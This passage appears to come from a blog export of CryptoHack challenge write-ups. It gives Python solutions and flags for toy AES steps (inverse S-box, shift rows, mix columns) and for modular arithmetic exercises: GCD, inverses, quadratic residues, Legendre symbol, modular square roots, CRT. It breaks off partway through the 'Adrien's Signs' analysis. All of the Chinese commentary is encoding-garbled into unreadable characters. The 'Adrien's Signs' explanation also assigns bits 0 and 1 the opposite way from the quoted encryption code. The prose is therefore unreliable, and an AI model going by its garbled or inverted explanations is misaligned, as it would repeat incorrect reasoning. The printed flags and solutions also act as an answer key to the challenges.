0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,)state = [ [251, 64, 182, 81], [146, 168, 33, 80], [199, 159, 195, 24], [64, 80, 182, 255],]def sub_bytes(s, sbox=s_box): ???print(sub_bytes(state, sbox=inv_s_box)) è§£12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,)state = [ [251, 64, 182, 81], [146, 168, 33, 80], [199, 159, 195, 24], [64, 80, 182, 255],]def sub_bytes(s, sbox=s_box): return [[sbox[byte] for byte in row] for row in s]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))print(matrix2bytes(sub_bytes(state, sbox=inv_s_box)))# b&#x27;crypto&#123;l1n34rly&#125;&#x27; Diffusion through Permutationé¢˜ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950def shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]def inv_shift_rows(s): ???# learned from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.cxtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def mix_single_column(a): # see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u)def mix_columns(s): for i in range(4): mix_single_column(s[i])def inv_mix_columns(s): # see Sec 4.1.3 in The Design of Rijndael for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v mix_columns(s)state = [ [108, 106, 71, 86], [96, 62, 38, 72], [42, 184, 92, 209], [94, 79, 8, 54],] è§£æ³¨æ„ï¼Œè¿™é‡Œçš„inv_mix_columns()å’Œinv_shift_rows()éƒ½æ˜¯æ²¡æœ‰è¾“å‡ºçš„ï¼Œæ‰€ä»¥åªèƒ½ç›´æ¥è°ƒç”¨ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859def shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]def inv_shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]# learned from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.cxtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def mix_single_column(a): # see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u)def mix_columns(s): for i in range(4): mix_single_column(s[i])def inv_mix_columns(s): # see Sec 4.1.3 in The Design of Rijndael for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v mix_columns(s)state = [ [108, 106, 71, 86], [96, 62, 38, 72], [42, 184, 92, 209], [94, 79, 8, 54],]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))inv_mix_columns(state)inv_shift_rows(state)print(matrix2bytes(state))# b&#x27;crypto&#123;d1ffUs3R&#125;&#x27; é¢˜è§£é¢˜è§£é¢˜è§£é¢˜è§£é¢˜è§£é¢˜è§£","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"}]},{"title":"Cyptohack Modular_Arithmetic Writeup","slug":"CTF/Crypto/Cyptohack-Modular-Arithmetic-Writeup","date":"2025-06-02T09:53:03.000Z","updated":"2025-06-02T18:51:18.225Z","comments":true,"path":"2025/06/02/CTF/Crypto/Cyptohack-Modular-Arithmetic-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/02/CTF/Crypto/Cyptohack-Modular-Arithmetic-Writeup/","excerpt":"","text":"Greatest Common Divisoré¢˜ è§£ç›´æ¥å®ç°ä¸€ä¸‹æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆè¾—è½¬ç›¸é™¤æ³•ï¼‰ï¼š 12345678910def gcd(x,y): if x == y: return x if x&lt;y: return gcd(x,y-x) else: return gcd(y,x-y) print(gcd(66528,52920))# 1512 ä¹Ÿå¯ä»¥æ›´ç²¾ç®€ä¸€ç‚¹ï¼š 1234def gcd(x, y): if y == 0: return x return gcd(y, x % y) Extended GCDé¢˜ è§£å®ç°ä¸€ä¸‹æ¬§å‡ é‡Œå¾—æ‹“å±•ç®—æ³•å°±å¥½äº†ï¼š 123456789101112def extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x, y = y1, x1 - (a // b) * y1 return (x, y) print(extended_gcd(26513,32321))# (10245, -8404)print(min(extended_gcd(26513,32321)))# -8404 Modular Arithmetic 1é¢˜ è§£1234x = 11 % 6y = 8146798528947 % 17print(min(x,y))# 4 Modular Arithmetic 2é¢˜ è§£12print(pow(273246787654,65536,65537))# 1 ä¹Ÿå¯ä»¥ç›´æ¥ç”¨è´¹é©¬å°å®šç†å£ç®—å‡ºç»“æœ1ï¼ˆå› ä¸º65537æ˜¯ä¸ªè´¨æ•°ï¼‰ã€‚ Modular Invertingé¢˜ è§£12print(pow(3,-1,13))# 9 Quadratic Residuesé¢˜ è§£123456789p=29ints=[14,6,11]for i in ints: for k in range(p): if pow(k,2,p) == i: print(min(k,(-k)%p)) break# 8 Legendre Symbolé¢˜ output.txtï¼š 123p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565] è§£å®ƒè¿™é‡Œçš„Legendre Symbolå…¶å®ç”¨çš„æ˜¯Eulerâ€™s criterionçš„ç»“è®ºæ¥å®šä¹‰çš„ã€‚ å‡è®¾ a^2 \\equiv x \\text{ mod } pæ³¨æ„åˆ° a \\equiv x^{\\frac{p+1}{4}} \\text{ mod } på› ä¸ºæ ¹æ®è´¹é©¬å°å®šç†æœ‰: a^2 \\equiv x^{\\frac{p+1}{2}} = x^{\\frac{p-1}{2}} \\cdot x \\equiv x \\text{ mod } på¹¶ä¸”å› ä¸º$p \\equiv 3 \\text{ mod } 4$ï¼Œ$\\frac{p+1}{4} \\in \\mathbb{Z}$ æ˜¯ä¸ªæ•´æ•°ã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥è®¡ç®—$a$ã€‚ ä»£ç ï¼š 12345678910111213141516p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139assert p%4==3ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565]for i in ints: if pow(i,(p-1)//2,p) == 1: x = i a = pow(x,(p+1)//4,p)assert pow(a,2,p) == xprint(a)# 93291799125366706806545638475797430512104976066103610269938025709952247020061090804870186195285998727680200979853848718589126765742550855954805290253592144209552123062161458584575060939481368210688629862036958857604707468372384278049741369153506182660264876115428251983455344219194133033177700490981696141526 Modular Square Rooté¢˜ output.txt: 123a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161 è§£Sageé‡Œå·²ç»å†…ç½®äº†è¿™ä¸ªç®—æ³•ã€‚ 12345678910111213141516171819from sage.all import *a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161# åœ¨ Sage ä¸­æ„é€ æœ‰é™åŸŸ GF(p)ï¼Œå¹¶æŠŠ a å½“ä½œè¯¥åŸŸçš„ä¸€ä¸ªå…ƒç´ ï¼šF = GF(p)x = F(a)# ç›´æ¥è°ƒç”¨ .sqrt() æ–¹æ³•ï¼ŒSage ä¼šè¿”å›ä¸€ä¸ªå¹³æ–¹æ ¹ã€‚å¦‚æœ a ä¸æ˜¯å¹³æ–¹å‰©ä½™ï¼Œ.sqrt() ä¼šæŠ¥é”™r = x.sqrt()r_int = Integer(r) other_root = p - r_intsmaller = min(r_int, other_root)print(smaller)# 2362339307683048638327773298580489298932137505520500388338271052053734747862351779647314176817953359071871560041125289919247146074907151612762640868199621186559522068338032600991311882224016021222672243139362180461232646732465848840425458257930887856583379600967761738596782877851318489355679822813155123045705285112099448146426755110160002515592418850432103641815811071548456284263507805589445073657565381850521367969675699760755310784623577076440037747681760302434924932113640061738777601194622244192758024180853916244427254065441962557282572849162772740798989647948645207349737457445440405057156897508368531939120 Chinese Remainder Theoremé¢˜ è§£å¯ä»¥ä½¿ç”¨ sympy åº“çš„ crt å‡½æ•°ï¼š 12345678910from sympy.ntheory.modular import crt# å®šä¹‰æ¨¡æ•°å’Œä½™æ•°moduli = [5, 11, 17]remainders = [2, 3, 5]x, mod = crt(moduli, remainders)print(f&quot;x â‰¡ &#123;x&#125; mod &#123;mod&#125;&quot;)# x â‰¡ 872 mod 935 Adrienâ€™s Signsé¢˜ 123456789101112131415161718192021222324from random import randinta = 288260533169915p = 1007621497415251FLAG = b&#x27;crypto&#123;????????????????????&#125;&#x27;def encrypt_flag(flag): ciphertext = [] plaintext = &#x27;&#x27;.join([bin(i)[2:].zfill(8) for i in flag]) #æŠŠæ¯ä¸ªå­—èŠ‚è½¬æˆ 8 ä½äºŒè¿›åˆ¶å½¢å¼çš„å­—ç¬¦ä¸²,æœ€å plaintext æ˜¯æ•´ä¸ªæ˜æ–‡æŒ‰äºŒè¿›åˆ¶å±•å¼€çš„é•¿å­—ç¬¦ä¸²ã€‚ for b in plaintext: e = randint(1, p) n = pow(a, e, p) if b == &#x27;1&#x27;: ciphertext.append(n) else: #b=0 n = -n % p ciphertext.append(n) return ciphertextprint(encrypt_flag(FLAG)) 1[67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547] è§£é¦–å…ˆåˆ†æä¸€ä¸‹åŠ å¯†è¿‡ç¨‹ï¼š å¦‚æœæ˜æ–‡çš„ç¬¬$i$ä½ï¼ˆè®°ä½œ$b$ï¼‰ç­‰äº0ï¼Œåˆ™å¯†æ–‡çš„ç¬¬$i$ä½ç­‰äº$a^e \\text{ mod }p$ï¼› å¦‚æœæ˜æ–‡çš„ç¬¬$i$ä½ï¼ˆè®°ä½œ$b$ï¼‰ç­‰äº1ï¼Œåˆ™å¯†æ–‡çš„ç¬¬$i$ä½ç­‰äº$-a^e \\text{ mod }p$ï¼› æ¯ä¸€è½®çš„eéƒ½æ˜¯éšæœºçš„ã€‚ æˆ‘ä»¬ç°åœ¨è®°æ¯ä¸€è½®çš„å¯†æ–‡ä¸º$c$ï¼Œæœ‰ c \\equiv a^e \\cdot (-1)^b \\text{ mod } pæ³¨æ„åˆ° a^{\\frac{p-1}{2}} \\equiv 1 \\text{ mod }p 